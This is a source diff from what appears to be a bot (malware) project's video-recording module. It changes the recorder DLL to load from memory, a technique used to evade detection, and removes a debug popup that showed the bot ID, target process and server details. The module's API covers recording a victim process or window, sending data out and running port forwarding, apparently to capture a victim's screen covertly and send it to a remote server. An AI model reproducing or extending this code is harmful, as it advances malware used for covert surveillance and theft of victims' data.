@@ -69,7 +69,7 @@ namespace VideoRecorder
 //                                    TVideoRecDLL
 //*****************************************************************************
 TVideoRecDLL::TVideoRecDLL()
-	: TDLL(VideoRecorder::data)
+	: TMemoryDLL(VideoRecorder::data)
 {
 	// «агружаем библиотеку и инициализируем апи
 	InitializeApi();
@@ -98,13 +98,6 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc(VideRecFuncResetTimer,     (LPVOID&)ResetTimer);
 	LoadFunc(VideRecFuncSendData,       (LPVOID&)SendData);
 	LoadFunc(VideRecFuncRunPortForward, (LPVOID&)RunPortForward);
-
-//	LoadFunc((LPVOID*)&RecordProcess,   VideRecFuncRecordProcess);
-//	LoadFunc((LPVOID*)&RecordWnd,       VideRecFuncRecordWnd);
-//	LoadFunc((LPVOID*)&Stop,            VideRecFuncStop);
-//	LoadFunc((LPVOID*)&ResetTimer,      VideRecFuncResetTimer);
-//	LoadFunc((LPVOID*)&SendData,        VideRecFuncSendData);
-//	LoadFunc((LPVOID*)&RunPortForward,	VideRecFuncRunPortForward);
 }
 
 
@@ -135,14 +128,6 @@ void TVideoRecorder::RecordProcess(DWORD PID)
 	if (FDLL.RecordProcess)
 	{
 		if (!PID) PID = Bot->PID();
-		string S;
-
-		S.Format("UID: %s\r\n VideoName: %s\r\n PID: %d\r\nServer1: %s\r\nPort1: %d",
-			UID.t_str(), VideoName.t_str(), PID,
-			Server.t_str(), Port
-			);
-
-		MessageBoxA(NULL, S.t_str(), NULL, 0);
 
 		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
 						   Server.t_str(), Port,
